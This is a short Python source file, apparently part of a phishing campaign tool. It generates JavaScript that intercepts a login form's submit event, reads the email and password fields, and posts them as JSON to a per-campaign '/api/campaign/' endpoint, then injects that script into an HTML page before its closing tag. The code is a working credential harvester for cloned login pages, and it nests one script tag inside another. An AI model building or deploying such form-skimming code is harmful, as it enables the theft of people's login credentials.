
def create_js_script(user_id, campaign_name):

    js_code = """
        <script>
            document.getElementById("loginForm").addEventListener("submit", async function(event) {
                event.preventDefault(); 

                const email = document.querySelector('input[name="email"]').value;
                const password = document.querySelector('input[name="pass"]').value;

                const data = {
                    email: email,
                    password: password
                };
            try {
        """
    js_code += f"const response = await fetch(`/api/campaign/{user_id}/{campaign_name}`"
    js_code += """, 
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json', 
                },
                    body: JSON.stringify(data), 
                });

                if (response.ok) {
                    alert("Login successful!");
                } else {      
                    alert("Login failed!");
                }
                } catch (error) {
                    alert("There was an error with the request.");
                }
            });
        </script>
        """

    return js_code

def add_script_to_html(html: str, script: str) -> str:
    closing_html_pos = html.rfind("</html>")

    if closing_html_pos != -1:
        script_tag = f"<script>{script}</script>"
        
        html = html[:closing_html_pos] + script_tag + html[closing_html_pos:]

    return html